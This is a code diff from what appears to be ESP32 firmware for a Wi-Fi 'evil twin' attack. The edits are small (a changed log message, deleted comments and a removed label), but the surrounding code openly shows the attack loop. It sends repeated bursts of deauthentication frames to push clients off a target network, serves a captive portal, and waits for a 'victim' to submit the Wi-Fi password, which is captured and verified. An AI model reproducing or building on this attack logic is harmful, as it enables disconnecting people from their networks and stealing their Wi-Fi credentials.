@@ -100,7 +100,7 @@ static void reset_wifi_to_apsta(const wifi_ap_record_t *target) {
 
 
 static void evil_twin_task(void *pvArg) {
-    ESP_LOGI(TAG, "Devil Twin [Optimized Stability Patch]");
+    ESP_LOGI(TAG, "Devil Twin Started");
 
     wifi_verify_init();
 
@@ -111,7 +111,6 @@ static void evil_twin_task(void *pvArg) {
     while (!password_verified) {
         ESP_LOGI(TAG, "Starting new cycle...");
 
-        // Ensure clean state and release old sockets/servers at cycle start
         stop_captive_portal();
         vTaskDelay(pdMS_TO_TICKS(200));
 
@@ -126,7 +125,6 @@ static void evil_twin_task(void *pvArg) {
 
 
         while (!victim_connected && !password_captured) {
-            // Burst 5 deauth frames with micro-delays to prevent TX buffer saturation
             for (int i = 0; i < 5; i++) {
                 wsl_bypasser_send_deauth_frame(target);
                 esp_rom_delay_us(2000);
@@ -152,7 +150,7 @@ static void evil_twin_task(void *pvArg) {
             if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num == 0) {
                 ESP_LOGI(TAG, "Victim disconnected without submitting password.");
                 victim_connected = false;
-                break; // Breaks out cleanly; outer loop will call stop_captive_portal()
+                break;
             }
         }
 
@@ -207,7 +205,6 @@ static void evil_twin_task(void *pvArg) {
         }
     }
 
-    cleanup:
     stop_captive_portal();
     if (password_verified) {
         restore_management_system();
